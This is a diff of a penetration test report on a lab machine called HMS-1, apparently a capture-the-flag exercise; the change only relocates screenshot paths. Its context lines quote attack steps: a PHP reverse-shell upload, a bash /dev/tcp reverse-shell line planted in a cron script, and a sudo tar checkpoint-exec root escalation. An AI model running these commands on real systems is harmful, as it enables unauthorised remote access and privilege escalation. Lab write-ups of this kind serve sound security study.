@@ -155,9 +155,9 @@ with an arbitrary password.
 
 The application authenticated me as an administrator without requiring valid credentials.
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image.png)
+![image.png](screenshots/image.png)
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%201.png)
+![image.png](screenshots/image%201.png)
 
 ### Security Impact
 
@@ -191,7 +191,7 @@ The application did not adequately restrict the uploaded file type. PHP files co
 
 I uploaded a PHP reverse-shell payload to the application's upload directory.
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%202.png)
+![image.png](screenshots/image%202.png)
 
 The uploaded file was subsequently accessible through:
 
@@ -199,7 +199,7 @@ The uploaded file was subsequently accessible through:
 curl http://192.168.1.102:7080/uploadImage/Logo/shell.php
 ```
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%203.png)
+![image.png](screenshots/image%203.png)
 
 ### Result
 
@@ -209,7 +209,7 @@ The uploaded PHP file executed successfully and provided an interactive shell ru
 daemon
 ```
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%204.png)
+![image.png](screenshots/image%204.png)
 
 ### Security Impact
 
@@ -285,7 +285,7 @@ Running:
 
 preserved the effective UID and provided access to the privileges associated with the `eren` account.
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%205.png)
+![image.png](screenshots/image%205.png)
 
 ### Result
 
@@ -328,7 +328,7 @@ Additionally:
 */5 * * * * eren /home/eren/backup.sh
 ```
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%206.png)
+![image.png](screenshots/image%206.png)
 
 ### Description
 
@@ -352,7 +352,7 @@ After obtaining the required write access, I added a reverse-shell command to th
 bash -i >& /dev/tcp/192.168.1.71/4445 0>&1
 ```
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%207.png)
+![image.png](screenshots/image%207.png)
 
 The cron job executed the modified script during its next five-minute cycle.
 
@@ -364,7 +364,7 @@ I received a shell running as:
 eren
 ```
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%208.png)
+![image.png](screenshots/image%208.png)
 
 ### Security Impact
 
@@ -421,7 +421,7 @@ followed by:
 sudo tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec="/bin/bash"
 ```
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%209.png)
+![image.png](screenshots/image%209.png)
 
 ### Result
 
@@ -522,7 +522,7 @@ User + Root Flags
 
 ---
 
-![image.png](HMS-1%20%E2%80%94%20Penetration%20Test%20Report/image%2010.png)
+![image.png](screenshots/image%2010.png)
 
 ## 10. Remediation Summary
 
